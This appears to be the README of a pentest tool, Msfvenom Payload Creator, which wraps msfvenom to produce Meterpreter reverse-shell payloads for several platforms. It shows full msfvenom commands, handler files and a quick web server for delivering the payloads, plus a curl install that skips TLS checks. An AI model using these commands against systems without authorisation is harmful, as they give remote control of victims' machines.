A **quick** way to generate various "basic" Meterpreter payloads via msfvenom (part of the Metasploit framework).

![Msfvenom Payload Creator (MPC)](https://i.imgur.com/KjlZjd9.png)

- - -

## About

Msfvenom Payload Creator (MPC) is a wrapper to generate multiple types of payloads, based on users choice. The idea is to be as **simple as possible** (**only requiring one input**) to produce their payload.

**Fully automating** Msfvenom & Metasploit is the end goal _(well as to be be able to automate MPC itself)_.
The rest is to make the user's life as **easy as possible** (e.g. **IP selection menu**, **msfconsole resource file/commands** and a **quick web server** etc).

The only necessary input from the user should be **defining the payload** they want by either the **platform** (e.g. `windows`), or the **file extension** they wish the payload to have (e.g. `exe`).

_Note: This will **not** try to bypass any anti-virus solutions._

## Install

* Designed for **Kali Linux 1.1.0a+** & **Metasploit v4.11+** _(nothing else has been tested)_.

```
curl -k -L "https://raw.githubusercontent.com/g0tmi1k/mpc/master/mpc.sh" > /usr/bin/mpc
chmod +x /usr/bin/mpc
mpc
```

## Help

``` bash
root@kali:/var/www# bash /root/mpc.sh
 [*] Msfvenom Payload Creator (MPC)

 [i] Missing type

 [i] /root/mpc.sh <TYPE> (<IP>) (<PORT>)
 [i] TYPE:
 [i]   + ASP (meterpreter)
 [i]   + Bash (meterpreter)
 [i]   + Linux (meterpreter)
 [i]   + PHP (meterpreter)
 [i]   + Python (meterpreter)
 [i]   + Windows (meterpreter)
 [i] IP will default to IP selection menu
 [i] PORT will default to 443
root@kali:/var/www#
```

## Example \#1 (PHP - Fully Automated)

```bash
root@kali:/var/www# bash /root/mpc.sh php 127.0.0.1
 [*] Msfvenom Payload Creator (MPC)
 [i]   IP: 127.0.0.1
 [i] PORT: 443
 [i] TYPE: PHP (php/meterpreter_reverse_tcp)
 [i]  CMD: msfvenom --payload php/meterpreter_reverse_tcp --format raw --platform php --arch php LHOST=127.0.0.1 LPORT=443 -o /var/www/php_meterpreter.php
No encoder or badchars specified, outputting raw payload
Saved as: /var/www/php_meterpreter.php
 [i] PHP meterpreter created as '/var/www/php_meterpreter.php'
 [i] MSF handler file create as 'php_meterpreter.rc (msfconsole -q -r /var/www/php_meterpreter.rc)'
 [?] Quick web server?   python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:/var/www#
```

## Example \#2 (Windows - Interactive)

```bash
root@kali:/var/www# bash /root/mpc.sh exe
 [*] Msfvenom Payload Creator (MPC)

 [i] Use which IP address?:
 [i]   1.) 192.168.103.136
 [i]   2.) 192.168.155.175
 [i]   3.) 127.0.0.1
 [?] Select 1-3: 2

 [i]   IP: 192.168.155.175
 [i] PORT: 443
 [i] TYPE: Windows (windows/meterpreter/reverse_tcp)
 [i]  CMD: msfvenom --payload windows/meterpreter/reverse_tcp --format exe --platform windows --arch x86 LHOST=192.168.155.175 LPORT=443 -o /var/www/windows_meterpreter.exe
No encoder or badchars specified, outputting raw payload
Saved as: /var/www/windows_meterpreter.exe
 [i] Windows meterpreter created as '/var/www/windows_meterpreter.exe'
 [i] MSF handler file create as 'windows_meterpreter.rc (msfconsole -q -r /var/www/windows_meterpreter.rc)'
 [?] Quick web server?   python -m SimpleHTTPServer 8080
 [*] Done!
root@kali:/var/www#
```

## To-Do List

* Display interface name next to IP address (e.g. `2.) 192.168.155.175 [eth1]`)
* Display file stats (e.g. file, size, md5/sha1) _Commands are in, just commented out._
* Cleaner command line arguments (e.g. `-ip 127.0.0.1`, `-v` etc)
* Support different payloads (e.g. `standard shells`/`nc` & `reverse_http`/`reverse_https`, `bind` etc)
* x64 payloads
